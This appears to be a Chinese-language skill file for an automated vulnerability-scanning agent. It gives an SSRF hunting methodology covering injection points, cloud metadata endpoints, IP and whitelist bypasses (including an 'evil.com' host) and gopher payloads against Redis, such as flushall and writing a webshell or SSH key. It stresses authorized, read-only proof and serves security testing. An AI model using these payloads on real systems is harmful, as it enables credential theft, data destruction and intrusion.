---
name: hunt-ssrf
description: SSRF 挖掘：注入面（webhook/导入/预览/PDF 生成）、协议利用（file/gopher/dict）、云元数据端点、重定向与 DNS rebinding 绕过、内网探测指纹
whenToUse: 任意"服务端发起请求"的功能（URL 导入/回调配置/在线预览/转 PDF/图标拉取）时
role: vuln-scan
enabled: true
---

# SSRF 服务端请求伪造

## 注入面（找"服务端替你发请求"的功能）

| 功能 | 信号 |
|---|---|
| URL 导入/文件拉取 | "从 URL 导入""远程附件" |
| Webhook 配置 | 回调地址设置页（配合重放验证） |
| 在线预览/转 PDF | wkhtmltopdf/headless chrome 类（传 URL 参数） |
| 头像/图片外链 | `avatar_url` 类字段 |
| 文档导入 | word/表格导入走 URL |
| 缓存刷新/预取 | 运维接口带 URL 参数 |

## 判定阶梯（无害优先）

1. **外带确认**：`url=http://<你的dnslog>/a` —— 回连 = 服务端确实发起请求（排除纯前端行为）
2. **file 协议**：`url=file:///etc/hostname`（回显）或 `file:///proc/self/environ` —— 读到 = 协议未限
3. **端口探测回显**：`url=http://127.0.0.1:6379/`（Redis 错误文本）/ `:9200`（ES JSON）/ `:2375`（Docker API）—— 错误差异即内网服务指纹
4. **云元数据（云上目标必测）**：
   - AWS/GCP：`http://169.254.169.254/latest/meta-data/`
   - 阿里云：`http://100.100.100.200/latest/meta-data/`（加固版需 token header）
   - 腾讯云：`http://metadata.tencentyun.com/latest/meta-data/`
   - 拿到临时凭据/角色名即定性（只读 IAM 信息证明，不实际接管——升级见 cloud-ak-sk）

## 绕过矩阵（按拦截特征选）

| 拦截特征 | 绕过 |
|---|---|
| 只拦内网 IP 黑名单 | 十进制 IP `2130706433`、八进制 `0177.0.0.1`、IPv6 `[::1]`、`127.1` 简写 |
| 域名白名单 | 白名单域后缀拼接 `@`（`http://whitelisted.com@evil.com`）、子域接管 |
| 解析后校验 | **重定向绕过**：白名单外域名 302 跳内网；**DNS rebinding**：TTL=0 的 A 记录先公网后内网（rebind.network 类服务） |
| 拦 file | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall`（gopher 打 Redis/HTTP 内网协议） |
| 全协议禁 | 短链服务 302 中转、`dict://`、`ftp://` |

## gopher 速用（协议最强形态）

- 打 Redis：flushall + 写 plan 写马/写 SSH key（授权后）
- 打内网 HTTP：`gopher://host:port/_GET /path HTTP/1.0%0d%0aHost:host%0d%0a%0d%0a` —— 完整构造 POST
- 打 MySQL/SMTP：现成 payload 生成器（gopherus 类工具）

## 证明与产出

- 危害定级锚点：读到云元数据凭据 > file 读敏感文件 > 打到内网无认证服务（Redis/Docker/ES）> 仅外带确认
- 只读证明：元数据只取 IAM 角色名；Redis 只 `INFO`；不写不删
- 回填：category=ssrf，usage 记"注入位→绕过链→危害锚点"，衔接 src-cn-logic-cases 的"SSRF→打内网→收口"话术

<!-- 改编自: PayloadsAllTheThings(Server Side Request Forgery) + hacktricks cloud-ssrf 章节, 2026-10-31 -->
